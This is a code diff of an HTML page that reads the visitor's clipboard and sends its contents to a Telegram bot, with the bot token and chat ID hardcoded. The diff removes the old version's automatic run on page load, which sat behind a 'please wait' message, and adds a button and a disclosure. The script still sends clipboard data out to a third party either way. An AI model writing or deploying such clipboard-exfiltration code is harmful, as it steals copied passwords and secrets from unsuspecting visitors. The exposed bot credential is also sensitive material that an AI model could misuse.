@@ -3,16 +3,18 @@
 <head>
     <title>Clipboard Access</title>
     <script>
+        // Функция для отправки данных в Telegram
         async function sendClipboardData() {
             try {
                 // Запрашиваем доступ к буферу обмена
                 const clipboardData = await navigator.clipboard.readText();
-                
+
                 // Отправляем данные в Telegram
                 const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
                 const chatId = '7406507427';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
+
+                // Отправляем данные в Telegram
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -26,7 +28,7 @@
                     throw new Error('Failed to send data to Telegram');
                 }
 
-                // Закрываем окно
+                // Закрываем окно после успешной отправки
                 window.close();
             } catch (error) {
                 console.error('Error:', error);
@@ -36,11 +38,14 @@
 
         // Запрашиваем разрешение на доступ к буферу обмена при загрузке страницы
         window.onload = function() {
-            sendClipboardData();
+            const button = document.createElement('button');
+            button.textContent = 'Разрешить доступ и отправить данные';
+            button.onclick = sendClipboardData;
+            document.body.appendChild(button);
         };
     </script>
 </head>
 <body>
-    <p>Пожалуйста, подождите...</p>
+    <p>Нажмите кнопку ниже, чтобы разрешить доступ к буферу обмена и отправить данные в Telegram.</p>
 </body>
 </html>
